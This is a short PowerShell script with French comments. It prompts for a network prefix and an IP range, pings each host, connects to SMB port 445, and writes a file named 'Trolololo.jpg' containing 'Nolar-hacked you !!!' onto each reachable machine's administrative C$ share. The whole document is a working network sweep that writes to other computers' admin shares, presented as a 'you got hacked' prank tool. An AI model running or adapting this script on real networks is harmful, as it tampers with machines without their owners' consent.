#################################################
# DEFINITION DES VARIABLES
#################################################

$port = 445
$net = read-host “Waht's Your Network: ”
$rangefirst = read-host “What's Your First range IP: ”
$rangelast = read-host “What's Your last range IP: ”
$range = $rangefirst..$rangelast
$ErrorActionPreference = 'SilentlyContinue'

#################################################
# Corps de la fonction
#################################################

#-------------------------------------------------------------------
# On definit pour chaque IP
#-------------------------------------------------------------------

foreach ($r in $range){
   $ip = “{0}.{1}” -F $net,$r

#-------------------------------------------------------------------
# On test les IPs UP
#-------------------------------------------------------------------

    If (Test-Connection -BufferSize 32 -ComputerName $ip -count 1 -quiet) {
   $socket = new-object System.Net.Sockets.TcpClient($ip, $port)

#-------------------------------------------------------------------
# On essaye de se connecter en smb sur la machine puis on transfert
#-------------------------------------------------------------------

        if($socket.Connected){
            $transfered = New-Item -Path "\\$ip\c$" -ItemType file -Name Trolololo.jpg -Value "Nolar-hacked you !!!"

#-------------------------------------------------------------------
# On voit si le transfert à été éffectué
#-------------------------------------------------------------------

                if ($transfered.Exists){
                    ""
                    Write-Verbose "Port Open and File has been Transfered on $IP"
                }
                Else {
                    ""
                    "Port Open but Error on Identification for $IP"
                }  
        }

#-------------------------------------------------------------------
# On ferme la fonction
#-------------------------------------------------------------------

    $socket.Close()
    }

#################################################
# END OF PROGRAM
#################################################
}
